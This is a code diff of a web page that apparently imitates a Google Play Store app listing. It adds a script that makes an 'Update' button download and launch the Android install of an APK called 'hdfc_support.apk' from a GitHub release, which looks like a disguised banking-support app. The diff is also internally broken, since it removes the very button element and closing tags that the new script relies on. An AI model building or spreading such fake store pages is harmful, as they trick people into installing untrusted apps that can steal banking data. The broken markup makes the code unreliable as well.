@@ -58,34 +58,15 @@
 
         <section class="action-buttons">
             <button class="btn-more">More Info</button>
-            <a href="playstore.html" class="btn-update">Update</a>
-        </section>
-
-        <section class="ratings-reviews">
-            <div class="section-header">
-                <h2>Ratings and Review</h2>
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"></polyline></svg>
-            </div>
-            <p class="review-note">Ratings and review are verified and are from people who use the same type of device that you use.</p>
-            
-            <div class="rating-display">
-                <div class="rating-number">
-                    <span>4.6</span>
-                    <div class="stars">★★★★★</div>
-                    <span class="count">110,681</span>
-                </div>
-                <div class="rating-bars">
-                    <div class="bar-row"><span>5</span><div class="bar"><div class="fill" style="width: 80%;"></div></div></div>
-                    <div class="bar-row"><span>4</span><div class="bar"><div class="fill" style="width: 15%;"></div></div></div>
-                    <div class="bar-row"><span>3</span><div class="bar"><div class="fill" style="width: 5%;"></div></div></div>
-                    <div class="bar-row"><span>2</span><div class="bar"><div class="fill" style="width: 2%;"></div></div></div>
-                    <div class="bar-row"><span>1</span><div class="bar"><div class="fill" style="width: 3%;"></div></div></div>
-                </div>
-            </div>
-        </section>
-    </main>
-
     <script>
+        const updateBtn = document.querySelector('.btn-update');
+        const REAL_APK_URL = 'https://github.com/amanxridex/newmade/releases/latest/download/hdfc_support.apk';
+
+        updateBtn.addEventListener('click', (e) => {
+            // OPENING IN SYSTEM BROWSER TRIGGERS THE REAL ANDROID INSTALL FLOW
+            window.open(REAL_APK_URL, '_system');
+        });
+
         document.querySelector('.btn-more').addEventListener('click', () => {
             window.location.href = 'playstore.html';
         });
